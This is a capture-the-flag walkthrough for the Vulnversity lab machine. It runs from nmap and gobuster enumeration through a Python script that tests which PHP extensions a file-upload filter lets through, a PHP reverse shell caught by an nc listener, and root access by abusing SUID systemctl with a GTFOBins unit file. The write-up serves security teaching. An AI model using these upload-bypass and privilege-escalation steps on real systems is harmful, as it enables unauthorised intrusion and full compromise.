# Vulnversity-CTF-Writeup
Vulnversity CTF walkthrough covering reconnaissance, web exploitation, reverse shell access, and privilege escalation using GTFOBins. For educational purposes only

## Target Information

* **IP Address:** `10.80.149.115`

---

## 1. Reconnaissance

### Nmap Scan

Initial service and version enumeration was performed using Nmap:

```bash
nmap -sC -sV -oN initial.nmap 10.80.149.115
```

### Results

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 (Ubuntu)
```

---

## 2. Web Enumeration

### Directory Brute-Forcing

```bash
gobuster dir \
  -u http://10.80.149.115:3333 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Discovered Directories

```text
/images
/css
/js
/fonts
/internal
```

---

## 3. Web Server Compromise (File Upload Bypass)

### Upload Filter Testing

A Python script was used to test allowed file extensions.

#### `file_upload.py`

```python
import requests

URL = "http://10.80.149.115:3333/internal/index.php"
FILE_PARAM = "file"

extensions = [".php", ".php3", ".php4", ".php5", ".phtml"]
payload = b"<?php echo 'CTF_TEST'; ?>"

for ext in extensions:
    filename = f"test{ext}"
    files = {FILE_PARAM: (filename, payload, "application/octet-stream")}

    r = requests.post(URL, files=files)
    print(f"[+] Tried {filename} -> Status: {r.status_code}")
```

### Result

```text
Upload successful with .phtml extension
```

---

## 4. Reverse Shell

### PHP Reverse Shell

Uploaded a PHP reverse shell (`php-reverse-shell.phtml`) with attacker IP and port configured.

### Listener

```bash
nc -lnvp 9999
```

### Connection

```text
uid=33(www-data)
```

---

## 5. Shell Stabilization

```bash
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

---

## 6. User Flag

### Enumeration

```bash
cd /home/bill
cat user.txt
```

### User Flag

```text
FLAG{REDACTED}
```

---

## 7. Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 2>/dev/null
```

Notable binary:

```text
/bin/systemctl
```

### Exploitation (GTFOBins)

```bash
TF=$(mktemp).service
```

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
```

```bash
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

### Root Shell

```bash
bash -p
```

---

## 8. Root Flag

```bash
cd /root
cat root.txt
```

### Root Flag

```text
FLAG{REDACTED}
```

---

## 9. Summary

* **Initial Access:** File upload bypass using `.phtml`
* **Shell:** PHP reverse shell
* **Privilege Escalation:** `systemctl` SUID abuse (GTFOBins)
* **Result:** Full root compromise

---

## Notes

This write-up is for educational purposes only.
